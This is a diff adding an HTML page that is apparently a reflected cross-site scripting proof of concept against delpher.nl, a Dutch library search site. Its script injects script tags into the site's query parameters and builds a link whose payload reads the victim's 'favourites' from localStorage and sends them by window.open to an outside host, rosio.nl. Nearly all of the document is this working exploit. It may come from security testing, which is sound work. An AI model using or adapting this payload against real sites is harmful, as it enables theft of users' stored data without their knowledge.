@@ -1,0 +1,19 @@
+<html>
+	<body>
+		<a id="link" target="_xss-delpher" href="https://www.delpher.nl/nl/platform/geo/view/?1<ScRiPt href='alert.js'><ScRiPt>">klik hier</a>
+
+		<script>
+			window.onload = function() {
+				var uri = encodeURIComponent('<ScRiPt\thref="http://ronald/test/xxs-test/alert"><ScRiPt>');
+				var base = 'https://delpher.nl/nl/boeken/results?coll=boeken&cql[]=(dateSort%20_gte_%20"01/01/1967")\'"()%26%25<acx><ScRiPt%20>{{SCRIPT}}<' + '/ScRiPt>&query=the%20or%20the%20and%20the%20and%20the';
+				var script =
+//					"s=localStorage['getItem']('settings');" +
+					"f=encodeURIComponent(JSON.stringify(localStorage['getItem']('favourites')));" +
+					"window.open('http://www.rosio.nl/kb/info.html?f='+f,'favs');"
+				;
+				console.log(encodeURI('<script>' + script + '<' + '/script>'));
+					document.getElementById('link').setAttribute('href', base.replace('{{SCRIPT}}', encodeURIComponent(script)));
+			}
+		</script>
+	</body>
+</html>
